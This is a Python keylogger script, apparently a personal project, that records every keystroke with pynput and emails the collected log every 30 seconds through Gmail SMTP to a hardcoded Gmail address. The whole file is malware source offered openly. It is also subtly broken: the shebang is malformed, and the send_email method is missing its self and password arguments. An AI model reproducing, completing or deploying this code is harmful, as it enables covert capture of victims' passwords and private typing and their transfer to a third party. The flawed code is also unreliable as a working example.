#/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:

   def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

   def pressed_key(self, key):

       try:
           self.log += str(key.char)

       except AttributeError:
           special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
           self.log += special_keys.get(key, f" {str(key)} ")

       print(self.log)


   def send_email(subject, body, sender, recipients, password):
       msg = MIMEText(body)   # Creating msg object using MIMEText class of email module
       msg['Subject'] = subject  # Assigning the subject
       msg['From'] = sender  # Assigning the sender email address
       msg['To'] = ', '.join(recipients)  # Assigning recepients email address.
       with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:   # Creating connection using context manager
          smtp_server.login(sender, password)
          smtp_server.sendmail(sender, recipients, msg.as_string())
       print(f"\nEmail sent Successfully!")


   def report(self):
       email_body = "El keylogger se ha iniciado correctamente" if self.is_first_run else self.log
       self.send_email("Keylogger Report", email_body, "ikerbermejo02@gmail.com", ["ikerbermejo02@gmail.com"]) 
       self.log = ""

       if self.is_first_run:
           self.is_first_run = False

       if not self.request_shutdown:
           self.timer = threading.Timer(30, self.report)
           self.timer.start()

   def shutdown(self):

       self.request_shutdown = True
       if self.timer:
          self.timer.cancel()


   def start(self):
       keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

       with keyboard_listener:
         self.report()
         keyboard_listener.join()

